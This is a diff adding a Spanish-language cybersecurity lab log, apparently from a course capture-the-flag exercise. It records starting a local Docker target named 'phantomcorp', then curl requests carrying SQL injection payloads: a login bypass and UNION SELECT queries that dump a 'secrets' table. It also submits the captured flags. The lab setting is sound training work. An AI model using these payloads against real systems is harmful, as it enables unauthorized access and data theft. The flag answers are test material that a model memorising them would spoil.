@@ -1,0 +1,20 @@
+Laboratorio 07 — bloque de Lorenzo — Grupo 07
+Fecha local: 2026-11-19 (America/Buenos_Aires)
+
+Preparación del objetivo local:
+  docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml up -d --build
+
+Requests ejecutados desde cyberlab-attacker (solo contra phantomcorp):
+  curl -sS -i -X POST http://phantomcorp/login --data-urlencode "user=admin' --" --data-urlencode 'pass=not-the-password'
+  curl -sS -i -G http://phantomcorp/buscar --data-urlencode 'q=Router'
+  curl -sS -i -G http://phantomcorp/buscar --data-urlencode "q=x' UNION SELECT 1,2 -- "
+  curl -sS -i -G http://phantomcorp/buscar --data-urlencode "q=x' UNION SELECT 1,2,3 -- "
+  curl -sS -i -G http://phantomcorp/buscar --data-urlencode "q=x' UNION SELECT * FROM secrets -- "
+  curl -sS -i -G http://phantomcorp/buscar --data-urlencode "q=x' UNION SELECT name,secret FROM secrets -- "
+
+Entrega de flags observadas (ejecutado desde la raíz del repositorio con Git Bash; se guardó el comando en un script para que Windows preserve las llaves de FLAG{...}):
+  ./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'
+  ./ctf submit 07 R2 'FLAG{sqli_union_dump}'
+  ./ctf status 07
+
+El estado completo está en salidas/status-07.txt. Las respuestas HTTP completas están en salidas/r1-r2-http.txt.
